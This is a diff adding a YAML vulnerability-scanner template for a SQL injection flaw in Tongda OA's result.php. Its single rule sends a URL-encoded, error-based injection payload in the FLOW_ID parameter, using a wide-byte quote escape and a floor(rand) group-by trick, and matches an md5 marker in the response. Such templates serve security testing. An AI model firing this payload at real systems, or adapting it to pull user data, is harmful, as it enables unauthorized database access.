@@ -1,0 +1,12 @@
+name: 通达OA-FLOW_ID-sql
+description: >-
+  sql注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /general/score/flow/scoredate/result.php?FLOW_ID=11%bf%27%20and%20%28SELECT%201%20from%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28select%20md5%281122%29%20from%20user%20limit%201%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%23
+    expression:
+      status: 200
+      body_all:
+        - "13b712de"
